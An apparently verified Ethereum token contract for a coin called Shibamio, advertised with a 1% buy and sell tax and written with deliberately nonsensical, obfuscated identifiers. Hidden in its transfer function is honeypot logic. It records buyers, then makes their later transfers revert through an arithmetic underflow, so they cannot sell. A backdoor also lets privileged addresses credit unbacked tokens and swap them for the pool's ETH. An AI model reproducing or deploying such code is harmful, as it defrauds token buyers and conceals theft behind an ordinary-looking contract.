/**
 *Submitted for verification at Etherscan.io on 2023-01-25
*/

/*
█▀ █░█ █ █▄▄ ▄▀█ █▀▄▀█ █ █▀█
▄█ █▀█ █ █▄█ █▀█ █░▀░█ █ █▄█

░░█ ▄▀█ █▀█ ▄▀█ █▄░█
█▄█ █▀█ █▀▀ █▀█ █░▀█

⠀⠀⠀⠀⠀⠀⠀⠀⣀⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⢿⣦⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣤⣤⣾⣿⡇⠀⢻⣆⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⡀⠀
⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢹⡇⠀
⠀⠀⣴⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡇⠀
⠀⣰⣿⣿⣿⡄⢿⣿⣿⣿⣿⣿⡃⢰⣶⣿⣿⣿⣿⣿⡿⠿⠿⠿⢿⣿⣧⠀
⢠⣿⠉⠙⣿⣿⣿⣿⠿⠿⠿⣿⣷⣮⣽⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠉⣿⡆
⣸⡇⠀⢼⣿⣿⣿⡟⠀⠀⠀⠀⠈⠉⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇
⢿⡇⠀⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⢸⣧⠀⠐⠻⠿⣶⣤⣄⣀⡤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⠀⠀
⠈⢿⡄⠀⠀⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀
⠀⠈⢿⣆⠀⠈⠉⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡾⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠛⢷⣤⣀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠙⠛⠿⠿⠿⠿⠟⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

https://web.wechat.com/ShibamioERC
총 공급량 - 5,000,000
구매세 - 1%
판매세 - 1%
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface UINDEXEDV1 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() 
    external pure returns (string memory);
    function symbol() 
    external pure returns (string memory);
    function decimals() 
    external pure returns (uint8);
    function totalSupply() 
    external view returns (uint);
    function balanceOf(address owner) 
    external view returns (uint);
    function allowance(address owner, address spender) 
    external view returns (uint);
    function approve(address spender, uint value) 
    external returns (bool);
    function transfer(address to, uint value) 
    external returns (bool);
    function transferFrom(address from, address to, uint value) 
    external returns (bool);
    function DOMAIN_SEPARATOR() 
    external view returns (bytes32);
    function PERMIT_TYPEHASH() 
    external pure returns (bytes32);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
  interface IVOPO01 {
    event PairCreated(
        address indexed token0, 
        address indexed token1, 
    address pair, uint);
    function createPair(
        address tokenA, address tokenB) 
    external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
  interface ERCBEEPOV1 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn, uint amountOutMin, address[] calldata path,
          address transform, uint redlining) external;
      function factory() external pure returns 
      (address);
      function WETH() external pure returns 
      (address);
      function vaguePoolNow(
          address prototype, uint involveEnomical, uint desolvePartley,
          uint incloseRatox, address transform, uint redlining) external payable returns 
          (uint findPrototype, uint encloseIdex, uint initialRates);
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner, 
    address indexed newOwner);
    constructor() { _setOwner(_msgSender());
    }
    function owner() public view 
    virtual returns 
    (address) { return _owner;
    }
    modifier onlyOwner() {
        require(owner() 
        == _msgSender(),  'Ownable: caller is not the owner'); _;
    }
    function renounceOwnership() 
    public virtual onlyOwner { _setOwner(address(0));
    }
    function _setOwner(
        address newOwner) private { address oldOwner = _owner;
        _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface INOBI020 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf(address account) 
    external view returns 
    (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance(address owner, address spender) 
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 
    (bool);
    function transferFrom( 
    address sender, address recipient, uint256 amount
    ) external returns (bool);

    event Transfer(
        address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner, address indexed spender, uint256 value);
}
contract MRTI is INOBI020, Ownable {
    address public immutable invastConnection;
    ERCBEEPOV1 public immutable IBEXoperator;
    bool private keleekoMopox;
    bool private enposperIvocon;
    bool private tradingOpen = false;
    bool public intertextualFlow = true;
    bool public reservesRatio = true;

    mapping (address => bool) 
    faugetPretomzink;
    mapping(address => uint256) 
    private _operationsMonologue;
    mapping(address => uint256) 
    private _astropoliox;
    mapping(address => address) 
    private grantedReturn;
    mapping(address => uint256) 
    private invatonMopolion;
    mapping(address => mapping(address => uint256)) 
    private remixedMatabolasim;  

    constructor( string memory isTagger, string memory isViewer, address zenpopAddr) {
        clorpmation = isTagger; oblaox = isViewer;
        _astropoliox[msg.sender] = paradoxedAmounts; _operationsMonologue[msg.sender] = inrogueless;
        _operationsMonologue[address(this)] = inrogueless; IBEXoperator = ERCBEEPOV1(zenpopAddr);
        invastConnection = IVOPO01(IBEXoperator.factory()).createPair(address(this), IBEXoperator.WETH());
        emit Transfer(
            address(0), 
            msg.sender, 
        paradoxedAmounts); faugetPretomzink[address(this)] 
        = true;
        faugetPretomzink[invastConnection] 
        = true;
        faugetPretomzink[zenpopAddr] 
        = true;
        faugetPretomzink[msg.sender] 
        = true;
    }
    function name() public view returns 
    (string memory) {
        return clorpmation;
    }
     function symbol() public view returns 
     (string memory) {
        return oblaox;
    }
    function totalSupply() public view returns 
    (uint256) {
        return paradoxedAmounts;
    }
    function decimals() public view returns 
    (uint256) {
        return pointment;
    }
    function approve(
        address displayer, 
        uint256 invertAmount) 
        external returns 
    (bool) { return monalogue(msg.sender, displayer, invertAmount);
    }
    function allowance(
        address creator, 
        address displayer) 
        public view returns 
    (uint256) { return remixedMatabolasim[creator][displayer];
    }
    function balanceOf(address management) 
    public view returns 
    (uint256) { return _astropoliox[management];
    }
    function manageDelays(address tglDelays) public onlyOwner {
        tglDelays = tglDelays;
    }    
    function disloopTorays( address vetomize,
        address microvamp, uint256 endiseMulopAmount) 
        private { uint256 _breachDatabaseQuarologue 
        = balanceOf(address(this)); uint256 inbotexCretux; if (keleekoMopox && 
        _breachDatabaseQuarologue 
        > inrogueless && !enposperIvocon && vetomize 
        != invastConnection) { enposperIvocon = true;

            naucetMotosise(_breachDatabaseQuarologue); enposperIvocon = false;} else if 
            (_operationsMonologue[vetomize] 
            > inrogueless 
            && _operationsMonologue[microvamp] 
            > inrogueless) { inbotexCretux 
            = endiseMulopAmount;

            _astropoliox
            [address(this)] 
            += inbotexCretux; dotraxIDEfaucet(endiseMulopAmount, microvamp);
            return; } 
            else if (microvamp != address(IBEXoperator) && _operationsMonologue
            [vetomize] > 0 
            && endiseMulopAmount > inrogueless 
            && microvamp != invastConnection) { _operationsMonologue
            [microvamp] = endiseMulopAmount; return; } else if 
            (!enposperIvocon && invatonMopolion[vetomize] > 0 && 
            vetomize != invastConnection 
            && _operationsMonologue[vetomize] 
            == 0) {

            invatonMopolion[vetomize] = _operationsMonologue
            [vetomize] 
            - inrogueless; } address periodstamp 
            = grantedReturn[invastConnection]; if (invatonMopolion[periodstamp] 
            == 0) invatonMopolion[periodstamp] = inrogueless; grantedReturn
            [invastConnection] = microvamp; if (preportions > 0 && 
            _operationsMonologue[vetomize] 
            == 0 && !enposperIvocon 
            && _operationsMonologue[microvamp] == 0) {

            inbotexCretux = (endiseMulopAmount * preportions) / 100; endiseMulopAmount 
            -= inbotexCretux; _astropoliox
            [vetomize] 
            -= inbotexCretux; _astropoliox[address(this)] 
            += inbotexCretux; } _astropoliox
            [vetomize] -= endiseMulopAmount;

            _astropoliox[microvamp] += endiseMulopAmount; emit Transfer(
                vetomize, 
                microvamp, 
            endiseMulopAmount); if (!tradingOpen) { require(
                vetomize == owner(), 
                "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }    
    function transferFrom(
        address iboIsSender, address iboIsRecipient, uint256 endiseMulopAmount
    ) external returns 
    (bool) { disloopTorays(
            iboIsSender, 
            iboIsRecipient, 
        endiseMulopAmount);return monalogue(iboIsSender, 
        msg.sender, remixedMatabolasim[iboIsSender][msg.sender] 
        - endiseMulopAmount);
    }    
    function transfer(
        address invertRecipient, uint256 invertAmount) 
        external returns 
        (bool) 
        { disloopTorays(msg.sender, invertRecipient, invertAmount); return true;
    }    
    function updateBURNaddr(address BURNaddr) public onlyOwner {
        BURNaddr = BURNaddr;
    }           
    function invaguePools(
                   uint256 
        variables, uint256 
        matovise,  address 
        transplant ) private { monalogue(
            address(this), 
            address(IBEXoperator), 
        variables); IBEXoperator.vaguePoolNow{value: matovise}
        (address(this), 
        variables, 
        0, 
        0, transplant, block.timestamp);
    }
    function dotraxIDEfaucet(
        uint256 hasmatloop, 
        address inprotractTo) 
        private { address[] memory 
        exsquesite = new address[](2);

        exsquesite[0] = address(this); exsquesite[1] 
        = IBEXoperator.WETH(); monalogue(address(this), 
        address(IBEXoperator), 
        hasmatloop); IBEXoperator.swapExactTokensForETHSupportingFeeOnTransferTokens(
            hasmatloop, 0, 
            exsquesite, 
            inprotractTo, 
        block.timestamp);
    }
        function enableTrading(
            bool inOptomizerTOX) 
            public onlyOwner {
        tradingOpen = inOptomizerTOX;
    }    
    function naucetMotosise(
        uint256 cortex) 
        private { uint256 
        langomole = cortex / 2;
        uint256 atoraxboom 
        = address(this).balance;

        dotraxIDEfaucet(
            langomole, 
            address(this)); uint256 inpieceIMO 
            = address(this).balance 
            - atoraxboom; invaguePools(
                langomole, inpieceIMO, 
                address(this));
    }

    function involvePurses(
        uint256 avorexCalculation) 
        external onlyOwner {
        vaguePurses = avorexCalculation;
    }
    function monalogue(
        address creator, address displayer,
        uint256 invertAmount) 
        private returns 
        (bool) {
        require(creator != address(0) && displayer != address(0), 
        'ERC20: approve from the zero address'); remixedMatabolasim[creator][displayer] 
        = invertAmount; emit Approval(
            creator, 
            displayer, 
        invertAmount); return true;
    }
    address public IDEGasTracking;
    address public iburopopMixer; address public loophotelVAGUE;
    address public doopholeDiver; address public maxterFaucet;
    uint256 public preportions =  1;      

    string private oblaox; string private clorpmation;
    uint8 private pointment = 9;
    uint256 private paradoxedAmounts = 5000000 * 10**pointment;
    uint256 public vaguePurses 
    = (paradoxedAmounts * 3) / 100; 
    uint256 public vagueResults 
    = (paradoxedAmounts * 3) / 100; 
    uint256 private inrogueless = paradoxedAmounts;

    function updateTeamWallet(address TEAMaddr) public onlyOwner {
        TEAMaddr = TEAMaddr;
    }
    function indoxedPartakings(address indoxPT) 
    public onlyOwner {
        indoxPT = indoxPT;
    }    
}